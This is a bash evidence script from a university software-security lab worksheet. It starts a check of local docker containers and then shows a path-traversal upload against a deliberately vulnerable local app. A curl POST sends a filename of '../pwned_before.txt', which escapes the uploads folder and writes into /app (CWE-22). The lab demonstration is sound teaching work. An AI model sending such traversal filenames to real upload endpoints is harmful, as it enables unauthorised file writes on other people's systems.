#!/bin/bash
# Week 1 evidence — Scene 1: environment + BEFORE (vulnerable /upload)
clear

echo "=============================================================="
echo " Worksheet 1 — Task 0 + Task 5/8 BEFORE  |  Software Security 1305315"
echo "=============================================================="
echo
echo "\$ printf '%s | %s | ' \"\$(whoami)\" '6631503092'; date '+%F %T %Z'"
printf '%s | %s | ' "$(whoami)" '6631503092'; date '+%F %T %Z'
echo
echo "--- Task 0: environment is up ---------------------------------"
echo "\$ docker ps --format '{{.Names}} | {{.Ports}}'"
docker ps --format '{{.Names}} | {{.Ports}}' | grep -E "week01|before|notevault"
echo
echo "\$ curl -s localhost:8083/notes     # vulnerable app (pre-fix)"
curl -s --max-time 5 localhost:8083/notes
echo; echo
echo "--- Task 5/8 BEFORE: path traversal SUCCEEDS ------------------"
echo "demo content" > /tmp/wk01-evidence/demo.txt
echo "\$ curl -s -X POST localhost:8083/upload -F 'file=@demo.txt;filename=../pwned_before.txt'"
curl -s --max-time 5 -X POST localhost:8083/upload -F "file=@/tmp/wk01-evidence/demo.txt;filename=../pwned_before.txt"
echo; echo
echo "  ^ response echoes the traversal path back (information disclosure)"
echo
echo "\$ docker exec wk01-before-vulnerable-app-1 ls -la /app/pwned_before.txt"
docker exec wk01-before-vulnerable-app-1 ls -la /app/pwned_before.txt
echo
echo ">>> ESCAPED uploads/ and landed in /app  =  CWE-22 arbitrary file write"
echo
echo "=============================================================="
